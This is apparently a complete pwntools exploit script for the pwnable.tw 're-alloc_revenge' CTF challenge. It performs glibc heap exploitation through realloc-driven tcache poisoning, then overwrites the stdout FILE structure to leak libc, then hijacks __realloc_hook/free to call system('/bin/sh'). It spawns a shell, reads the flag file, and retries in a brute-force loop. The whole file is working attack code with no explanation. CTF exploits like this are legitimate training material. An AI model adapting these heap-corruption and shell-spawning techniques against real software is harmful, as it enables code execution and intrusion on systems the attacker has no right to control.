from pwn import *

r = remote('chall.pwnable.tw', 10310)
# r = process('./re-alloc_revenge_patched')
context.clear(os='linux', arch='x86_64', log_level='debug')
bin = ELF('./re-alloc_revenge_patched')
libc = ELF('./libc.so.6')

def allocate(idx, size, data):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Index:', str(idx).encode())
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendafter(b'Data:', data)

def reallocate(idx, size, data):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'Index:', str(idx).encode())
    r.sendlineafter(b'Size:', str(size).encode())
    if size != 0:
        r.sendafter(b'Data:', data)
    else:
        r.recvuntil(b'alloc error\n')

def rfree(idx):
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Index:', str(idx).encode())

# with open('/proc/%d/maps' % r.pid, 'r') as f:
#     for _ in range(6):
#         f.readline()
#     libc.address = int('0x' + f.read(12), 16)
#     log.info('Libc address: %#x' % libc.address)

def exploit():
    # two_bytes = p64(libc.symbols['__realloc_hook'] - 0x10)[:2]
    two_bytes = b'\x18\x1c'
    allocate(0, 0x60, b'\x00'*0x18 + p64(0x71))
    allocate(1, 0x60, b'\x00'*0x18 + p64(0x21))
    rfree(1)
    reallocate(0, 0, b'')
    reallocate(0, 0x40, b'\x80')
    allocate(1, 0x60, b'\n')
    rfree(0)
    allocate(0, 0x70, b'Hello World')
    reallocate(0, 0x50, b'Hello World')
    reallocate(0, 0x70, b'Hello World')
    reallocate(0, 0x50, b'Hello World')
    reallocate(0, 0x70, b'Hello World')
    reallocate(0, 0x50, b'Hello World')
    reallocate(0, 0x70, b'Hello World')
    reallocate(0, 0x50, b'Hello World')
    reallocate(0, 0x70, b'Hello World')
    reallocate(0, 0x50, b'Hello World')
    reallocate(0, 0x70, b'Hello World')
    reallocate(0, 0x50, b'Hello World')
    reallocate(0, 0x70, b'\x00'*0x38 + p64(0x21) + p64(0)*3 + p64(0x21))
    rfree(0)
    allocate(0, 0x60, b'\x00')
    reallocate(0, 0, b'')
    reallocate(0, 0x60, p64(0)*2)
    reallocate(0, 0, b'')
    reallocate(1, 0x40, b'\x00'*0x18 + p64(0x31))
    reallocate(0, 0, b'')
    reallocate(0, 0x20, p64(0)*2)
    reallocate(0, 0, b'')
    reallocate(1, 0x40, b'\x00'*0x18 + p64(0x421))
    rfree(0)
    reallocate(1, 0x40, b'\x00'*0x18 + p64(0x71) + two_bytes)
    allocate(0, 0x60, b'\n')
    two_bytes = p16(u16(two_bytes) + 0xb48)
    reallocate(1, 0x40, b'\x00'*0x18 + p64(0xc1) + two_bytes)
    rfree(1)
    allocate(1, 0x20, b'\n')
    rfree(0)
    reallocate(1, 0x70, p64(0)*2)
    rfree(1)
    allocate(0, 0x20, p64(0xfbad3887) + p64(0)*3)
    libc.address = u64(r.recv(16)[8:]) - 0x1e7570
    log.success('Libc address : %#x' % libc.address)
    # gdb.attach(r, '''b*main+69''')
    payload = b'/bin/sh\x00' + p64(libc.address + 0x99190) + p64(libc.symbols['system'])
    allocate(1, 0x60, payload)
    rfree(1)
    r.sendline("cat /home/re-alloc_revenge/flag")
    print(r.recv())
    r.interactive()

# exploit()

while True:
    try:
        exploit()
    except:
        r.close()
        r = remote('chall.pwnable.tw', 10310)
        # r = process('./re-alloc_revenge_patched')